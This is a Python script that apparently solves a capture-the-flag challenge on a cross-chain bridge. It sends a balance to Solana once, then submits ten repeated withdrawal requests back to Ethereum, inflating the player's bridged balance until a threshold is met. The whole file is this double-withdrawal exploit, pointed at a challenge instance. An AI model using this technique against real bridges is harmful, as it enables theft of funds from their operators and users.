import httpx
import json
import os
import subprocess
import time
from tqdm import tqdm

NUM_REQUESTS = 10
INSTANCE_URL = os.getenv("INSTANCE_URL")
SETUP_ADDR = os.getenv("INSTANCE_ADDR")
info = httpx.get(f"{INSTANCE_URL}/player.json").json()
eth_player_addr = info["ethereum"]["address"]


def get_balance():
    # using web3 is pain so use cast
    cmd = f'cast call $(cast call {SETUP_ADDR} "bridge()(address)") "accounts(address)(uint256)" {eth_player_addr} --json'
    result = json.loads(subprocess.check_output(cmd, shell=True).decode("utf-8"))
    return int(result[0])


def main():
    for i in range(100):
        balance = get_balance()
        print(f"{balance=}")

        if balance >= 1000000010:
            break

        # toSol
        payload = {
            "key": info["ethereum"]["private_key"],
            "amount": balance,
            "target": info["solana"]["pubkey"],
        }
        headers = {"Content-Type": "application/json"}
        httpx.post(f"{INSTANCE_URL}/toSol", json=payload, headers=headers)

        time.sleep(20)

        # toEth
        for j in tqdm(range(10)):
            payload = {
                "key": str(info["solana"]["keypair"]),
                "amount": balance,
                "target": info["ethereum"]["address"],
            }
            headers = {"Content-Type": "application/json"}
            httpx.post(f"{INSTANCE_URL}/toEth", json=payload, headers=headers)


if __name__ == "__main__":
    main()
